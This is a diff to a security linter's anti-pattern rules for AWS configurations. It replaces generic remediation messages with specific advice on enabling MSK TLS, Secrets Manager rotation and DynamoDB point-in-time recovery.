@@ -26988,7 +26988,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "MSK cluster allowing plaintext client connections exposes Kafka data in transit",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Data transmitted or stored without encryption is readable by anyone with network or storage access. Use TLS 1.2+ for data in transit. Use AES-256-GCM for data at rest. Never disable certificate verification (verify=False, NODE_TLS_REJECT_UNAUTHORIZED=0)."
+                "MSK with ClientBroker: PLAINTEXT sends Kafka messages without encryption. Set: ClientBroker: TLS. Configure producers and consumers with security.protocol=SSL and ssl.truststore.location pointing to the trust store. TLS_PLAINTEXT allows both — avoid it."
             ),
     },
     {
@@ -26997,7 +26997,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Secrets Manager secret without automatic rotation increases credential risk",
         "severity": Severity.INFO,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "Secrets Manager without RotationConfiguration means the secret stays the same indefinitely — a compromised credential never expires. Enable: RotationRules: AutomaticallyAfterDays: 30. Create a Lambda rotation function using the SecretsManager rotation template."
             ),
     },
     {
@@ -27006,7 +27006,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "DynamoDB table without point-in-time recovery risks unrecoverable data loss",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: DynamoDB table without point-in-time recovery risks unrecoverable data loss. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "DynamoDB without PointInTimeRecoverySpecification: PointInTimeRecoveryEnabled: true means accidental DeleteItem or BatchWriteItem cannot be undone. Enable PITR: aws dynamodb update-continuous-backups --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true. Restores to any second within 35 days."
             ),
     },
     {
